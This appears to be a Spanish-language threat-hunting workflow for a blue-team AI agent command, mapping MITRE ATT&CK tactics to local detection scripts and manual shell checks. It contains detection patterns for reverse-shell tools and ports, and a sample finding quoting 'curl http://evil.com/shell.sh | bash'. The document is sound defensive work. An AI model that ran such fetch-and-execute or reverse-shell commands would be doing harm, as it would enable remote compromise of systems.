---
description: Proactive threat hunting based on MITRE ATT&CK
---

# /hunt - Threat Hunting Workflow

Búsqueda proactiva de amenazas basada en MITRE ATT&CK.

## Uso
```
/hunt [technique|tactic|indicator]
```

## Targets de hunting:
- `persistence` - Mecanismos de persistencia (TA0003)
- `privesc` - Escalación de privilegios (TA0004)
- `evasion` - Evasión de defensas (TA0005)
- `lateral` - Movimiento lateral (TA0008)
- `c2` - Comando y control (TA0011)
- `exfil` - Exfiltración de datos (TA0010)
- `creds` - Acceso a credenciales (TA0006)
- `all` - Todas las técnicas

## Ejemplos:
- `/hunt persistence`
- `/hunt lateral-movement`
- `/hunt C2-beaconing`
- `/hunt all`

## Pasos del Workflow

### 1. Definir hipótesis de hunting
Basado en:
- Inteligencia de amenazas reciente
- Técnicas comunes de atacantes
- Anomalías detectadas previamente

### 2. Ejecutar hunting
// turbo
```bash
cd ~/Documents/BlueTeam\ -\ KaliLinux && ./tools/custom-scripts/threat_hunter.sh --hunt-all
```

### 3. Hunting específico por táctica

#### Persistencia (TA0003):
```bash
./tools/custom-scripts/threat_hunter.sh --persistence
```

#### Escalación de privilegios (TA0004):
```bash
./tools/custom-scripts/threat_hunter.sh --privesc
```

#### Evasión de defensas (TA0005):
```bash
./tools/custom-scripts/threat_hunter.sh --evasion
```

#### Movimiento lateral (TA0008):
```bash
./tools/custom-scripts/threat_hunter.sh --lateral
```

#### Comando y Control (TA0011):
```bash
./tools/custom-scripts/threat_hunter.sh --c2
```

### 4. Analizar resultados
- Revisar findings en `alerts/hunt/`
- Correlacionar con otros eventos
- Validar falsos positivos

### 5. Documentar hallazgos
- Crear IOCs si se encuentran amenazas
- Actualizar reglas de detección
- Mejorar hipótesis de hunting

## Técnicas de Hunting por MITRE ATT&CK

### TA0003 - Persistence
| Técnica | Qué buscar |
|---------|------------|
| T1053 | Crontabs sospechosos |
| T1543 | Servicios systemd nuevos |
| T1547 | Scripts de autostart |
| T1546 | Modificaciones a .bashrc |
| T1098 | Usuarios con UID 0 |

### TA0004 - Privilege Escalation
| Técnica | Qué buscar |
|---------|------------|
| T1548 | SUID binaries inusuales |
| T1068 | Core dumps, exploits |
| T1548.003 | NOPASSWD en sudoers |

### TA0005 - Defense Evasion
| Técnica | Qué buscar |
|---------|------------|
| T1070 | Logs truncados/vacíos |
| T1027 | Archivos ofuscados |
| T1564 | Archivos ocultos en /tmp |
| T1014 | Indicadores de rootkit |

### TA0008 - Lateral Movement
| Técnica | Qué buscar |
|---------|------------|
| T1021 | Conexiones SSH inusuales |
| T1021.002 | Conexiones SMB |
| T1570 | Transferencias de archivos |

### TA0011 - Command and Control
| Técnica | Qué buscar |
|---------|------------|
| T1071 | Conexiones a puertos inusuales |
| T1572 | DNS tunneling |
| T1573 | Canales cifrados sospechosos |
| T1095 | Raw sockets |

## Comandos de Hunting Manual

### Buscar procesos sospechosos:
```bash
ps aux | grep -E "(nc|ncat|netcat|bash -i|python -c|perl -e)"
```

### Buscar conexiones sospechosas:
```bash
ss -tunapl | grep -E ":(4444|5555|6666|1337|31337)"
```

### Buscar archivos modificados recientemente:
```bash
find / -mtime -1 -type f 2>/dev/null | head -100
```

### Buscar usuarios con UID 0:
```bash
awk -F: '($3 == 0) {print}' /etc/passwd
```

### Buscar SUID binaries:
```bash
find / -perm -4000 -type f 2>/dev/null
```

### Buscar archivos ocultos en /tmp:
```bash
find /tmp /var/tmp /dev/shm -name ".*" -type f
```

## Output Esperado

```
🎯 Threat Hunting Results
═══════════════════════════════════════════════════════════════

📊 Hunt Summary:
   • Tactics checked: 7
   • Techniques evaluated: 45
   • Findings: 3
   • False positives: 1

🔍 Findings:

   [HIGH] Suspicious Crontab Entry
   ├── Technique: T1053 - Scheduled Task/Job
   ├── Location: /var/spool/cron/crontabs/www-data
   └── Details: curl http://evil.com/shell.sh | bash

   [MEDIUM] Unusual SUID Binary
   ├── Technique: T1548 - Abuse Elevation Control
   ├── Location: /usr/local/bin/custom_tool
   └── Details: Recently created, not in package manager

   [LOW] High DNS Activity
   ├── Technique: T1572 - Protocol Tunneling
   ├── Connections: 150 to port 53
   └── Details: Possible DNS tunneling, needs investigation

📋 Recommendations:
   1. Investigate crontab entry immediately
   2. Verify SUID binary legitimacy
   3. Monitor DNS traffic for tunneling patterns
```
